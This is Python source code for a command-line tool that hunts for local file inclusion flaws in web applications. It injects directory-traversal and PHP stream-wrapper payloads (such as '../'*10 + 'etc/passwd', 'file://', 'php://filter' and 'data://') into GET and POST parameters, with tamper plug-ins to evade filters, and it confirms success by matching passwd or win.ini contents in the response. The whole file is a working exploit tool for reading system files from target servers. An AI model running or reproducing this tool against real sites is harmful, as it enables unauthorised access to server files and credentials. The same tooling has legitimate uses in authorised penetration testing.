import sys
import requests
import importlib
import base64
import random
from argparse import ArgumentParser
from datetime import datetime
from copy import deepcopy
from re import findall

class ANSIcolor():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    PAYLOAD_BLUE='\033[38;5;75m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BOLD = "\033[1m"
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


class LFIexploit():
    URL=''
    Target=''
    GET_Data={}
    POST_Data={}
    Method='NOT_SET'
    Cookie=''
    Header=''
    Tamper=[]
    DEBUG_LEVEL=1
    OS='all'
    SpecifyParam=[]
    SkipParam=[]
    SpecifyPrefix=''
    SpecifySuffix=''
    TestingTechnique=[]
    def __init__(self,url:str,data='',cookie='',header='',tamper='',os='all',v=1,p='',skip='',prefix='',suffix='',technique=''):
        self.URL=url
        self.COOKIE=cookie
        self.HEADER=header
        self.Tamper=(tamper.split(',') if tamper else [])
        self.DEBUG_LEVEL=v
        self.OS=os
        self.SpecifyParam=(p.split(',') if p else [])
        self.SkipParam=(skip.split(',') if skip else [])
        self.SpecifyPrefix=[prefix,''][prefix==None]
        self.SpecifySuffix=[suffix,''][suffix==None]
        self.TestingTechnique=(technique.split(',') if technique else [])
        
        if '?' in url:
            self.Method='GET'
            self.Target=url.split('?')[0]
            self.GET_Data=self.ParamToDict(url.split('?')[1])
        else:
            self.URL=url
        
        if data:
            self.Method='POST'
            self.POST_Data=self.ParamToDict(data)

    def ParamToDict(self,param:str):
        tmp={}
        for i in param.split('&'):
            key,value=i.split('=',1)
            tmp[key]=value
        return tmp

    def DictToParam(self,data:dict):
        tmp=''
        for key,value in data.items():
            tmp+=f'&{key}={value}'
        return tmp[1:]
    
    def PrefixMoveTesting(self,key):
        characters='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        RandomString=''.join(random.choice(characters) for _ in range(10))
        PayloadList=[
            {
                'OS':'linux',
                'technique':'PM',
                'description':'absolute path (linux)',
                'payload':'/etc/./passwd',
                'result_regex_check':'[0-9a-zA-Z]+:x:[0-9]+:[0-9]+',
                'result':[]
            },
            {
                'OS':'windows',
                'technique':'PM',
                'description':'absolute path (windows)',
                'payload':'C:/Windows/./win.ini',
                'result_regex_check':'; for 16-bit app support',
                'result':[]
            },
            
            {
                'OS':'linux',
                'technique':'PM',
                'description':'prefix move (linux)',
                'payload':'../'*10+'etc/./passwd',
                'result_regex_check':'[0-9a-zA-Z]+:x:[0-9]+:[0-9]+',
                'result':[]
            },
            {
                'OS':'windows',
                'technique':'PM',
                'description':'prefix move (windows)',
                'payload':'../'*10+'Windows/./win.ini',
                'result_regex_check':'; for 16-bit app support',
                'result':[]
            },
            
            {
                'OS':'linux',
                'technique':'PM',
                'description':'prefix move and question mark "?" (linux)',
                'payload':'../'*10+'e?c/./p??s?d',
                'result_regex_check':'[0-9a-zA-Z]+:x:[0-9]+:[0-9]+',
                'result':[]
            },
            {
                'OS':'windows',
                'technique':'PM',
                'description':'prefix move and question mark "?" (windows)',
                'payload':'../'*10+'Wi?do?s/./w?n.?ni',
                'result_regex_check':'; for 16-bit app support',
                'result':[]
            },

            {   # data://
                'OS':'all',
                'technique':'SW',
                'description':"Stream Wrappers 'data://'",
                'payload':f'data://text/plain;base64,{base64.b64encode(RandomString.encode()).decode()}',
                'result_regex_check':RandomString,
                'result':[]
            },

            {   # file://
                'OS':'linux',
                'technique':'SW',
                'description':"Stream Wrappers 'file://' (linux)",
                'payload':'file:///etc/./passwd',
                'result_regex_check':'[0-9a-zA-Z]+:x:[0-9]+:[0-9]+',
                'result':[]
            },
            {
                'OS':'windows',
                'technique':'SW',
                'description':"Stream Wrappers 'file://' (windows)",
                'payload':'file://C:/Windows/./win.ini',
                'result_regex_check':'; for 16-bit app support',
                'result':[]
            },

            {   # php://filter
                'OS':'linux',
                'technique':'SW',
                'description':"Stream Wrappers 'php://filter' (linux)",
                'payload':'php://filter/resource=/etc/./passwd',
                'result_regex_check':'[0-9a-zA-Z]+:x:[0-9]+:[0-9]+',
                'result':[]
            },
            {
                'OS':'windows',
                'technique':'SW',
                'description':"Stream Wrappers 'php://filter' (windows)",
                'payload':'php://filter/resource=C:/Windows/./win.ini',
                'result_regex_check':'; for 16-bit app support',
                'result':[]
            },

            {   # php://filter - base64
                'OS':'all',
                'technique':'SW',
                'description':"Stream Wrappers 'php://filter' base64",
                'payload':f'php://filter/read=convert.base64-decode/resource=data://text/plain,{base64.b64encode(RandomString.encode()).decode()}',
                'result_regex_check':RandomString,
                'result':[]
            }
        ]
        PayloadNumber=[]
        exp=deepcopy(self)
        
        for i in range(0,len(PayloadList)):

            # if current OS not is 'all', do skip
            if exp.OS != 'all' and PayloadList[i]['OS']!='all' and PayloadList[i]['OS']!=exp.OS:
                if exp.DEBUG_LEVEL == 2:
                    print(f"{MsgEvent('DEBUG')} skipping test => {PayloadList[i]['description']}")
                continue
            
            if PayloadList[i]['technique'] not in exp.TestingTechnique:
                if exp.DEBUG_LEVEL == 2:
                    print(f"{MsgEvent('DEBUG')} skipping test => {PayloadList[i]['description']}")
                continue
            
            print(f"{MsgEvent('INFO')} testing => {PayloadList[i]['description']}")
            payload=f"{self.SpecifyPrefix}{PayloadList[i]['payload']}{self.SpecifySuffix}"
            for j in exp.Tamper:
                bypass = importlib.import_module(f"tamper.{j}")
                payload=bypass.tamper(payload)
                
            if exp.DEBUG_LEVEL == 2:
                print(f"{MsgEvent('PAYLOAD')} {key}={payload}")
            if key in exp.GET_Data:
                exp.GET_Data[key]=payload
                res=CheckConnection(exp)
                
            if key in exp.POST_Data:
                exp.POST_Data[key]=payload
                res=CheckConnection(exp)

            FindPayload=findall(rf"{PayloadList[i]['result_regex_check']}",res.text)
            
            if len(FindPayload)>0:
                print(f"{MsgEvent('INFO')} {ANSIcolor.BOLD}payload find : {payload}{ANSIcolor.RESET}")
                if exp.OS=='all':
                    exp.OS=PayloadList[i]['OS']
                    self.OS=PayloadList[i]['OS']
                    print(f"{MsgEvent('INFO')} {ANSIcolor.BOLD}OS is {PayloadList[i]['OS']}{ANSIcolor.RESET}")
                PayloadList[i]['result']=FindPayload
                PayloadNumber.append(i)

        return PayloadList,PayloadNumber


    def Run(self):
        for key,value in {**self.POST_Data, **self.GET_Data}.items():
            if key not in self.SpecifyParam and self.SpecifyParam != []:
                continue
            if key in self.SkipParam and self.SkipParam != []:
                continue
            
            # PM  = Prefix Move Testing
            # SW  = Stream Wrappers Testing
            # PT  = Path Truncation Testing
            # SQL = SQL injection load_file()
            PayloadNumber=[]
            if 'SQL' in self.TestingTechnique:
                pass
            
            PayloadList,PayloadNumber=self.PrefixMoveTesting(key)

            if PayloadNumber:
                print('-------------------------\n')
                print(f'Parameter: {key} ({self.Method})')
                for i in PayloadNumber:
                    print(f"    technique: {PayloadList[i]['description']}")
                    print(f"    Payload: {PayloadList[i]['payload']}")
                    if self.DEBUG_LEVEL == 2:
                        print(f"    Result: {PayloadList[i]['result'][0]}")
                    print()
                print('-------------------------')
                break

        
        if not PayloadNumber:
            print(f'{MsgEvent("WARNING")} Could not find any usable payloads.',end='')
            print(['\n',f' Perhaps try adding the parameter \'--suffix "%00"\'?'][self.SpecifySuffix==''])


def logo():
    # Tmplr
    print()
    print(f'     /{ANSIcolor.GREEN} ┳┓┏┳┓     ┓ ┏┓┳{ANSIcolor.RESET}  v1.0')
    print(f'    / {ANSIcolor.GREEN} ┣┫ ┃ ╋┏┓┏┓┃ ┣ ┃{ANSIcolor.RESET}')
    print(f' . /  {ANSIcolor.GREEN} ┻┛ ┻ ┗┗ ┗┻┗┛┻ ┻{ANSIcolor.RESET}')
    print()

def MsgEvent(event:str) -> str:
    tmp=f"[{ANSIcolor.PAYLOAD_BLUE}{datetime.now().strftime('%H:%M:%S')}{ANSIcolor.RESET}]"

    if event == 'INFO':
        tmp=f"{tmp} [{ANSIcolor.GREEN}INFO{ANSIcolor.RESET}]"
    if event == 'WARNING':
        tmp=f"{tmp} [{ANSIcolor.YELLOW}WARNING{ANSIcolor.RESET}]"
    if event == 'DEBUG':
        tmp=f"{tmp} [{ANSIcolor.BLUE}DEBUG{ANSIcolor.RESET}]"
    if event == 'PAYLOAD':
        tmp=f"{tmp} [{ANSIcolor.PAYLOAD_BLUE}PAYLOAD{ANSIcolor.RESET}]"
    
    return tmp


def CheckConnection(WebTarget:LFIexploit):
    res=None
    if WebTarget.Method=='GET':
        res=requests.get(
            f'{WebTarget.Target}?{WebTarget.DictToParam(WebTarget.GET_Data)}',
            headers={
                'Cookie': WebTarget.Cookie,
            }
        )
    elif WebTarget.Method=='POST':
        res=requests.post(
            WebTarget.URL,
            data=WebTarget.POST_Data,
            headers={
                'Cookie': WebTarget.Cookie,
            }
        )
    return res


def ProGramARGS():
    if len(sys.argv)==1:
        print(f"usage: {sys.argv[0]} [-h]")
        exit(0)

    parser = ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    
    parser.add_argument("-u","--url",type=str,required=True,help="input URL")
    parser.add_argument("--data",type=str,help="POST data")
    parser.add_argument("--cookie",type=str,help="cookie session")
    parser.add_argument("--header",type=str,help="headers")
    parser.add_argument("--tamper",type=str,help="tamper file")
    parser.add_argument("-v",type=int,metavar='DEBUG_LEVEL',choices=[1,2,3],default=1,help="debug information")
    parser.add_argument("--os",type=str,metavar='OS type',choices=['windows','linux','all'],default='all',help="debug information")
    parser.add_argument("--prefix",type=str,help="Specify prefix")
    parser.add_argument("--suffix",type=str,help="Specify suffix")
    parser.add_argument("--technique",type=str,default='PM',help="Specify testing techniques, supporting PM and SW options; the default is PM.")
    group.add_argument("-p",type=str,metavar='PARAM',help="Specify parameters")
    group.add_argument("--skip",type=str,metavar='PARAM',help="skip parameters")

    return parser.parse_args()


def main():
    logo()
    args = ProGramARGS()
    web_exploit=LFIexploit(
        args.url,
        args.data,
        args.cookie,
        args.header,
        args.tamper,
        args.os,
        args.v,
        args.p,
        args.skip,
        args.prefix,
        args.suffix,
        args.technique
    )

    if web_exploit.Method=='NOT_SET':
        print('please update data')
        exit(0)
    
    if (CheckConnection(web_exploit).status_code==403):
        print("can't to connect.")
        exit(0)
    
    for i in web_exploit.SpecifyParam:
        if i not in web_exploit.GET_Data and i not in web_exploit.POST_Data:
            print("Specify Param not exist.")
            exit(0)
    
    for i in web_exploit.SkipParam:
        if i not in web_exploit.GET_Data and i not in web_exploit.POST_Data:
            print("Skip Param not exist.")
            exit(0)
    
    # PM  = Prefix Move Testing
    # SW  = Stream Wrappers Testing
    # PT  = Path Truncation Testing
    # SQL = SQL injection load_file()
    for i in web_exploit.TestingTechnique:
        if i not in ['PM','SW','PT','SQL']:
            print("Haven't technique.")
            exit(0)

    web_exploit.Run()
    

if __name__ == '__main__':
    main()